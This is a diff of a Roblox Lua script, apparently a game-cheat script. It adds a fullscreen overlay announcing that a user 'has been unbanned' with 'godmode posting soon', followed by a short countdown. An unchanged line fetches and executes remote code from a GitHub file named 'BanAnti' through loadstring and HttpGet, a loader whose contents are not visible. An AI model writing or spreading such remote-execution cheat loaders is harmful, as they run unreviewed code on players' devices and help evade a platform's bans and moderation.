@@ -1,4 +1,57 @@
 -- helllo
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Parent = player.PlayerGui
+gui.ResetOnSpawn = false
+
+-- Black background frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.Parent = gui
+
+-- Main message
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, 0, 0.6, 0)
+label.Position = UDim2.new(0, 0, 0.1, 0)
+label.BackgroundTransparency = 1
+label.Text = "MaybeFlashh / Brandon has been unbanned,\ngodmode posting soon."
+label.TextColor3 = Color3.new(1, 1, 1)
+label.TextScaled = true
+label.TextWrapped = true
+label.Font = Enum.Font.GothamBold
+label.Parent = frame
+
+-- Countdown timer
+local timer = Instance.new("TextLabel")
+timer.Size = UDim2.new(1, 0, 0.3, 0)
+timer.Position = UDim2.new(0, 0, 0.6, 0)
+timer.BackgroundTransparency = 1
+timer.Text = "5"
+timer.TextColor3 = Color3.new(1, 1, 0)
+timer.TextScaled = true
+timer.Font = Enum.Font.GothamBold
+timer.Parent = frame
+
+-- Countdown
+for i = 5, 1, -1 do
+    timer.Text = i .. " seconds remaining..."
+    
+    -- Change color based on time left
+    if i <= 2 then
+        timer.TextColor3 = Color3.new(1, 0, 0) -- Red
+    elseif i <= 3 then
+        timer.TextColor3 = Color3.new(1, 0.5, 0) -- Orange
+    else
+        timer.TextColor3 = Color3.new(1, 1, 0) -- Yellow
+    end
+    
+    task.wait(1)
+end
+
+-- Remove GUI
+gui:Destroy()
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/scripture2025/Checker/refs/heads/main/BanAnti"))()
 
 local s = Instance.new("Sound", workspace)
